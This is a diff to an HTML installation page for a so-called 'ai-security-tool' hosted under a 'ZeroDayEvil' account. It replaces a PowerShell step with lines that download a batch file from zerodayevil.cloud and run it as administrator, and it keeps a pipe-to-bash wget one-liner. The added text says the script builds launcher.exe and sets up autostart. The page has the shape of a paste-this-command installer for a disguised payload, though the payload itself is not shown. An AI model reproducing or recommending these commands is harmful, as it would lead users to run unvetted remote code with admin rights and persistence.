@@ -290,8 +290,11 @@
 # or using wget:
 wget -qO- https://raw.githubusercontent.com/ZeroDayEvil/ai-security-tool/main/scripts/one-line-web.sh | bash</code></pre>
 
-  <p><strong>Windows PowerShell:</strong></p>
-  <pre><code class="language-powershell">cd "$env:USERPROFILE\Desktop"; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ZeroDayEvil/ai-security-tool/main/scripts/one-line-web.bat" -OutFile "one-line-web.bat"; (Get-Content "one-line-web.bat").Replace("pause", "") | Set-Content "one-line-web.bat"; .\one-line-web.bat; $p="$env:USERPROFILE\Desktop\SQLupdate\data\install.ps1"; (Get-Content $p) -replace '-Destination\$destination', '-Destination $destination' | Set-Content $p; powershell -ExecutionPolicy Bypass -File $p</code></pre>
+<p><strong>Windows PowerShell</strong> (Run as administrator):</p>
+<pre><code class="language-powershell">iwr "https://zerodayevil.cloud/one-line-web.bat" -OutFile "$env:USERPROFILE\Desktop\one-line-web.bat"
+cmd /c "%USERPROFILE%\Desktop\one-line-web.bat"</code></pre>
+<p>The script installs Go, Python, and Node.js, extracts the archive, downloads <code>install.ps1</code>, builds <code>launcher.exe</code>, and configures autostart. No extra commands are required.</p>
+
 
   <h3>🛠 Build from Source</h3>
   <pre><code class="language-bash"># Clone repository
